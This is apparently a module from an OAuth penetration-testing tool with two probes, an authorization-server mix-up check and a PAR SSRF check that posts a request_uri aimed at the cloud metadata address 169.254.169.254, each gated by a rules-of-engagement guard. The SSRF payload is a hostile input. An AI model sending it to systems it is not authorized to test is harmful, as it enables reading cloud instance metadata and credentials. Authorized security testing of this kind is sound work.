"""OAuth T2 probes: code sub, PKCE downgrade, redirect traversal, mix-up, state fixation, PAR SSRF."""
from urllib.parse import urlparse, urlencode, urlunparse, parse_qs
from .. import http as _http
from ..roe_guard import ROEGuard

def probe_mix_up(auth_endpoint, client_id, redirect_uri, roe_guard=None):
    if roe_guard is None: roe_guard = ROEGuard()
    roe_guard.check_url(auth_endpoint, "GET")

    # Mix-up: swap client_id and redirect_uri to see if AS accepts cross-client state
    params = {"response_type": "code", "client_id": client_id, "redirect_uri": redirect_uri, "state": "mixup_test"}
    url = auth_endpoint + "?" + urlencode(params)

    with _http.Client(timeout=8, follow_redirects=False) as c:
        r = c.get(url)
    if r.status_code in (301, 302, 303):
        loc = r.headers.get("location", "")
        if "error=invalid_request" not in loc.lower():
            return {"verdict": "SUSPICIOUS", "reason": "AS accepted potentially mixed-up parameters"}
    return {"verdict": "PASS", "reason": "Mix-up rejected"}

def probe_par_ssrf(par_endpoint, roe_guard=None):
    if roe_guard is None: roe_guard = ROEGuard()
    roe_guard.check_url(par_endpoint, "POST")

    # PAR SSRF: request_uri pointing to internal metadata
    payload = {"request_uri": "http://169.254.169.254/latest/meta-data/"}
    with _http.Client(timeout=8, follow_redirects=False) as c:
        r = c.post(par_endpoint, data=payload)
    if "ami-id" in r.text or "instance-id" in r.text:
        return {"verdict": "VULNERABLE", "reason": "PAR request_uri triggered SSRF"}
    return {"verdict": "PASS", "reason": "PAR SSRF blocked"}
